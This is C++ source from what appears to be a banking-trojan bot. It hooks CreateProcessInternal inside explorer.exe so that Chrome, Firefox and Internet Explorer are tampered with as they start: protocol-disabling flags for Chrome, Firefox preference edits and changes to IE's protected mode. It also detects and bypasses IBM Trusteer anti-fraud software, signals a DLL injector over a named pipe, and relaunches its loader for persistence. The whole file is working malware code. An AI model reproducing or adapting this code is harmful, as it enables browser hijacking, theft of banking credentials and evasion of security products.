#include "..\Common.h"
#include "..\MinHook\include\MinHook.h"

static DWORD (WINAPI *Real_CreateProcessInternal)
(
   DWORD                 unknown1,
   PWCHAR                lpApplicationName,
   PWCHAR                lpCommandLine,
   LPSECURITY_ATTRIBUTES lpProcessAttributes,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   BOOL                  bInheritHandles,
   DWORD                 dwCreationFlags,
   LPVOID                lpEnvironment,
   PWCHAR                lpCurrentDirectory,
   LPSTARTUPINFO         lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation,
   DWORD                 unknown2
);

// this function replaces original CreateProcessInternal (unknown arguments present becuase internal functions are not documented)
static DWORD WINAPI My_CreateProcessInternal(
   DWORD                 unknown1,
   PWCHAR                lpApplicationName,
   PWCHAR                lpCommandLine,
   LPSECURITY_ATTRIBUTES lpProcessAttributes,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   BOOL                  bInheritHandles,
   DWORD                 dwCreationFlags,
   LPVOID                lpEnvironment,
   PWCHAR                lpCurrentDirectory,
   LPSTARTUPINFO         lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation,
   DWORD                 unknown2)
{
   // save original arguments
   char *lpCommandLineA     = Utf16toUtf8(lpCommandLine);
   char *lpApplicationNameA = Utf16toUtf8(lpApplicationName);
   // allocate some space for a replaced argument
   char *myCommandLine      = (char *) Alloc(32768 + 1);
   char *exeName            = Funcs::pPathFindFileNameA(lpApplicationNameA);

   if(lpCommandLineA)
      Funcs::pLstrcpyA(myCommandLine, lpCommandLineA);

   // check if ibm truesteer is installed
   BOOL trusteer                 = FALSE;
   char programX86path[MAX_PATH] = { 0 };
   Funcs::pSHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programX86path);
   Funcs::pLstrcatA(programX86path, Strs::fileDiv);
   Funcs::pLstrcatA(programX86path, Strs::trusteer);
   if(Funcs::pPathFileExistsA(programX86path))
      trusteer = TRUE;

   BOOL inject    = FALSE;
   BOOL vistaHack = FALSE;
   // if a chrome process is being created right now then disable spdy quic and http2
   if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)
   {
      Funcs::pLstrcatA(myCommandLine, Strs::exp17); 
      inject   = TRUE;
      trusteer = FALSE;
   }
   // if a firefox process is being created right now then edit prefs.js file
   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)
   {
      SetFirefoxPrefs();
      inject = TRUE;
   }
   // if a IE process is being created right now then edit registry values responsible for IE safety
   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)
   {
      DisableMultiProcessesAndProtectedModeIe();
      inject = TRUE;
   }
   else if(Funcs::pLstrcmpiA(exeName, "") == 0 || 
           Funcs::pLstrcmpiA(exeName, Strs::verclsidExe) == 0)
   {
      vistaHack = TRUE; //don't ask me why
   }

   if(trusteer)
      dwCreationFlags = dwCreationFlags | CREATE_SUSPENDED;

   wchar_t *myCommandLineW = Utf8toUtf16(myCommandLine);

   DWORD ret = 0; 
   // replace command line (only for chrome) and create suspended if trusteer is installed
   if(!vistaHack)
   {
      ret = Real_CreateProcessInternal(unknown1, 
                                       lpApplicationName, 
                                       myCommandLineW, 
                                       lpProcessAttributes, 
                                       lpThreadAttributes, 
                                       bInheritHandles, 
                                       dwCreationFlags, 
                                       lpEnvironment, 
                                       lpCurrentDirectory, 
                                       lpStartupInfo, 
                                       lpProcessInformation, 
                                       unknown2);
   }

   // if there is no need to inject a dll or an error occured then exit
   if(!inject || !ret)
      goto exit;
   // if the control flow is here then the process (browser) was creatated (but was not run if trusteer presents because created suspended and the thread will be resumed before returning from BypassTrusteer) and the injection should be made

   if(trusteer)
   {
      //if trusteer is x64 explorer will be too so we can inject directly
      BOOL x64 = IsProcessX64(lpProcessInformation->hProcess);
      if(x64)
      {
         lpProcessInformation->dwProcessId = BypassTrusteer(lpProcessInformation, lpApplicationNameA, lpCommandLineA);
         trusteer = FALSE;
      }
      else
         // terminate the process to let the x86 dll in dllhost to create it again (InjectionServerThread will call BypassTrusteer which will call CreateProcess)
         Funcs::pTerminateProcess(lpProcessInformation->hProcess, 0);
   }

   char pipeName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]  = { 0 };
   GetBotId(botId);
   Funcs::pWsprintfA(pipeName, Strs::pipeName, botId);
   // open the pipe created in bot/bot.cpp InjectionServerThread
   HANDLE hPipe = Funcs::pCreateFileA
   (
      pipeName,
      GENERIC_WRITE | GENERIC_READ,
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      NULL,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL,
      NULL
   );
   DWORD writtenRead;

   // send the information to dllhost.exe (only x86 version of dll can inject code and this version is injected in dllhost)
   Funcs::pWriteFile(hPipe, &lpProcessInformation->dwProcessId, sizeof(lpProcessInformation->dwProcessId), &writtenRead, NULL);
   Funcs::pWriteFile(hPipe, &trusteer, sizeof(trusteer), &writtenRead, NULL);
   if(trusteer)
   {
      int applicationNameLen = Funcs::pLstrlenA(lpApplicationNameA);
      Funcs::pWriteFile(hPipe, &applicationNameLen, sizeof(applicationNameLen), &writtenRead, NULL);
      Funcs::pWriteFile(hPipe, lpApplicationNameA, applicationNameLen, &writtenRead, NULL);

      int commandLineA = Funcs::pLstrlenA(lpCommandLineA);
      Funcs::pWriteFile(hPipe, &commandLineA, sizeof(commandLineA), &writtenRead, NULL);
      Funcs::pWriteFile(hPipe, lpCommandLineA, commandLineA, &writtenRead, NULL);
   }
   Funcs::pCloseHandle(hPipe);

exit:
   Funcs::pFree(lpCommandLineA);
   Funcs::pFree(lpApplicationNameA);
   Funcs::pFree(myCommandLine);
   Funcs::pFree(myCommandLineW);
   return ret;
}

static char botId[BOT_ID_LEN] = { 0 };

static void Restart()
{
   Funcs::pSleep(500);

   // remove hooks
   MH_DisableHook(MH_ALL_HOOKS);
   MH_Uninitialize();

   // get the path to the loader in appdata
   char installPath[MAX_PATH] = { 0 };
   GetInstallPath(installPath);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };
   startupInfo.cb                  = sizeof(startupInfo);
   // run the loader (repeat the whole cicle again)
   Funcs::pCreateProcessA(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
   Funcs::pCloseHandle(processInfo.hProcess);
   Funcs::pCloseHandle(processInfo.hThread);
}

// entry point (after dllmain and entrythread in main.cpp) called when the dll from dllhost.exe injected a suitable dll in explorer.exe
void HookExplorer()
{
   // hook CreateProcessInternal
   MH_Initialize();
   MH_CreateHookApi(Strs::wKernel32, Strs::exp18, My_CreateProcessInternal, (LPVOID *) &Real_CreateProcessInternal);
   MH_CreateHookApi(Strs::wKernelBase, Strs::exp18, My_CreateProcessInternal, (LPVOID *) &Real_CreateProcessInternal);
   MH_EnableHook(MH_ALL_HOOKS);

   // open a mutex created in dllhost.exe
   GetBotId(botId);
   HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, botId);
   // wait for termination of dllhost.exe
   Funcs::pWaitForSingleObject(hMutex, INFINITE);
   Funcs::pCloseHandle(hMutex);
   // restart (run from loader/main.cpp, inject x86 dll in dllhost, dllmain from dllhost, startbot from bot/bot.cpp, inject explorer exe and hookexplorer from bot/explorer.cpp)
   Restart();
}
